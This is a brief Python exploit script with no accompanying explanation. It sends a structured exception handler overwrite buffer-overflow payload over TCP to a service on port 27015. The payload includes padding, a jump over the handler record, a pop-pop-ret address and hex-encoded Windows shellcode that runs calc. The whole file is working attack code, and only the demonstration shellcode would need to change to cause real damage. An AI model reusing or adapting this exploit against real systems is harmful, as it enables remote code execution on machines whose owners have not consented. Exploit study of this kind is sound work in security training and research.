import socket
import binascii

winexec_calc_shellcode = b'31c94931d2e347526863616c6389e65256648b72308b760c8b760cad8b308b7e188b5f3c8b5c1f788b741f2001fe8b4c1f2401f90fb72c5142ad813c0757696e4575f18b741f1c01fe033caeffd7'
winexec_calc_shellcode = binascii.unhexlify(winexec_calc_shellcode)  # calc shellcode

host = '192.168.100.2' # your ip here
port = 27015

cookie = b"\xfe\xca\xfe\xca"
sizebyte = b"\x90"
jmpoverseh = b"\xeb\x06\x90\x90"
paddingtoseh = b"A" * 0xc4
ppr = b"\x5c\x1a\x40\x00"
exitp = b"\x68\x00\x00\x00\x00\xE8\x18\x23\x26\x00"


data = sizebyte + paddingtoseh + jmpoverseh + ppr  + winexec_calc_shellcode + exitp


payload = cookie + data #+ winexec_calc_shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.sendall(payload)
s.close()